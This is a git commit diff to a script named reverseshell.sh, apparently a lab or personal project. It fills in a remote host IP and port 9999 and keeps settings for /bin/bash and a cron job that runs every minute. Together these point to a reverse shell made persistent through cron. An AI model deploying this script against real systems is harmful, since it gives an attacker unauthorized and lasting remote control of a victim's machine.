c3d4f2dd34162f8e2f449c6ddf678f4d85277619
Alharthi987 <151471476+Alharthi987@users.noreply.github.com>
2024-01-09 22:06:11 +0000

    Update reverseshell.sh

--- reverseshell.sh
+++ reverseshell.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Configuration
-RHOST="your.remote.host"  # Replace with your remote host IP or domain
-RPORT="your_port"         # Replace with your remote host port
+RHOST="192.168.230.133"  # Replace with your remote host IP or domain
+RPORT="9999"         # Replace with your remote host port
 SHELL_CMD="/bin/bash"     # Shell to use for the reverse connection
 CRON_INTERVAL="* * * * *" # Cron job interval (this sets it to every minute)
 
